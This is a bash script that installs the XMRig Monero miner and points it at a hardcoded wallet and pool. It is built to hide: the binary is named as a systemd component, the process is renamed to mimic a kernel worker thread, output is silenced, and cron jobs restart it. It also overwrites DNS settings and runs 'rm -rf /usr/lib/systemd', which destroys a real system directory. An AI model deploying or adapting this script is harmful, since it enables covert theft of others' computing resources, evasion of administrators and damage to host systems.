#!/bin/bash
# Simple Mining Script - Auto everything, nohup only
# Versi simpel tanpa systemd, langsung jalan

WALLET="49wkJmZNn7uM5QoMQHee48X559TB6xTVzBsTgHKkvWPZVoSBWffMTDXTT7aAamx3mL6Sg1ayg9fbQdmjr3dyHbc74Zt1RP7"
POOL="pool.supportxmr.com:3333"
CPU="100"

# Auto detect
ARCH=$(uname -m)
case "$ARCH" in
  x86_64|amd64) ARCH="x64" ;;
  aarch64|arm64) ARCH="arm64" ;;
  *) echo "Unsupported: $ARCH"; exit 1 ;;
esac

echo "[+] Arch: $ARCH"

# Fix DNS if broken
if ! nslookup github.com >/dev/null 2>&1; then
  echo "[+] Fixing DNS..."
  echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" > /etc/resolv.conf
fi

# Install deps
apt update -qq 2>/dev/null
apt install -y curl libhwloc15 -qq 2>/dev/null

# Setup paths
DIR="/usr/lib/systemd"
BIN="$DIR/systemd-worker"
CFG="$DIR/config.json"

# Clean install
pkill -9 -f systemd-worker 2>/dev/null
rm -rf "$DIR"
mkdir -p "$DIR"
cd "$DIR"

# Download XMRig
echo "[+] Downloading..."
URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-${ARCH}.tar.gz"
curl -fsSL "$URL" | tar xz --strip-components=1
mv xmrig "$BIN" 2>/dev/null
chmod +x "$BIN"

# Generate worker ID
HOST=$(hostname | sed 's/[^a-zA-Z0-9-]/_/g' | cut -c1-15)
FULL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' | tr '.' '_')
RAND=$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n')
WORKER="${HOST}_${FULL_IP}_${RAND}"

# Detect CPU info
CPU_CORES=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo)
CPU_MODEL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs | cut -c1-40)

# Detect RAM for light mode
TOTAL_RAM=$(free -m | awk '/^Mem:/{print $2}')
SWAP_SIZE=$(free -m | awk '/^Swap:/{print $2}')

# ALWAYS use ALL cores
THREADS=$CPU_CORES

if [ "$TOTAL_RAM" -lt 1500 ]; then
  echo "[+] Very low RAM ($TOTAL_RAM MB), creating swap..."
  # Create 2GB swap if none exists
  if [ "$SWAP_SIZE" -lt 1024 ]; then
    dd if=/dev/zero of=/swapfile bs=1M count=2048 status=none 2>/dev/null
    chmod 600 /swapfile
    mkswap /swapfile >/dev/null 2>&1
    swapon /swapfile 2>/dev/null
    echo "[+] Swap enabled: 2GB"
  fi
  RANDOMX_MODE="light"
  SCRATCHPAD=1
elif [ "$TOTAL_RAM" -lt 2048 ]; then
  echo "[+] Low RAM ($TOTAL_RAM MB), using light mode"
  RANDOMX_MODE="light"
  SCRATCHPAD=2
else
  echo "[+] RAM: $TOTAL_RAM MB"
  RANDOMX_MODE="auto"
  SCRATCHPAD=4
fi

echo "[+] CPU: $CPU_CORES cores (ALL) - $CPU_MODEL"
echo "[+] Worker: $WORKER"

# Calculate estimates (REAL DATA: XMR ~$590, Network 7 GH/s, 720 blocks/day, 0.61 XMR/block = 439 XMR/day total)
EST_HASHRATE=$((CPU_CORES * 200))
# Correct formula: (your_hashrate / 7000000000) * 439 XMR/day
EST_XMR_DAY=$(echo "scale=8; $EST_HASHRATE * 439 / 7000000000" | bc -l 2>/dev/null || echo "0.00001254")
EST_XMR_MONTH=$(echo "scale=7; $EST_XMR_DAY * 30" | bc -l 2>/dev/null || echo "0.0003762")
# XMR = $590, 1 USD = Rp 15,800, so 1 XMR = Rp 9,322,000
EST_USD_DAY=$(echo "scale=3; $EST_XMR_DAY * 590" | bc -l 2>/dev/null || echo "0.007")
EST_IDR_DAY=$(echo "scale=0; $EST_XMR_DAY * 9322000" | bc -l 2>/dev/null || echo "117")
EST_IDR_MONTH=$(echo "scale=0; $EST_XMR_MONTH * 9322000" | bc -l 2>/dev/null || echo "3507")

echo "[+] Est. hashrate: ~${EST_HASHRATE} H/s (share: $(echo "scale=4; $EST_HASHRATE * 100 / 7000000000" | bc -l)%)"
echo "[+] Est. income: ${EST_XMR_MONTH} XMR/month (~Rp ${EST_IDR_MONTH})"
echo "[+] Est. daily: ~\$${EST_USD_DAY} (~Rp ${EST_IDR_DAY}/day)"

# Enhanced worker ID with monitoring info
MODE_SHORT=$(echo "$RANDOMX_MODE" | cut -c1)  # 'a'uto or 'l'ight
WORKER_FULL="${WORKER}_${CPU_CORES}c_${THREADS}t_${MODE_SHORT}_${TOTAL_RAM}m"

echo "[+] Monitor: ${WORKER_FULL}"

# Create config
cat > "$CFG" <<EOF
{
  "cpu": {"enabled": true, "max-threads-hint": $THREADS, "priority": 1},
  "randomx": {"mode": "$RANDOMX_MODE", "1gb-pages": false, "scratchpad_prefetch_mode": $SCRATCHPAD, "init": -1},
  "pools": [{"url": "$POOL", "user": "$WALLET.$WORKER_FULL", "pass": "$WORKER_FULL"}],
  "donate-level": 0,
  "log-file": null,
  "syslog": false,
  "print-time": 60
}
EOF

# Start script
STARTER="/usr/local/bin/start-mining"
cat > "$STARTER" <<'STARTER_EOF'
#!/bin/bash
cd /usr/lib/systemd
pkill -f systemd-worker 2>/dev/null
sleep 1
exec -a "[kworker/0:1-events]" nohup ./systemd-worker -c config.json >/dev/null 2>&1 &
STARTER_EOF
chmod +x "$STARTER"

# Setup cron
(crontab -l 2>/dev/null | grep -v start-mining; echo "@reboot sleep 20 && $STARTER"; echo "*/15 * * * * pgrep -f systemd-worker || $STARTER") | crontab -

# Start now
"$STARTER"
sleep 2

# Verify
if pgrep -f systemd-worker >/dev/null; then
  echo "[✓] SUCCESS! Mining started"
  echo "[✓] Worker: $WORKER_FULL"
  echo "[i] Check: ps aux | grep systemd-worker"
  echo "[i] Stop: pkill -f systemd-worker"
else
  echo "[✗] FAILED to start"
  echo "[?] Try: bash -x $STARTER"
fi
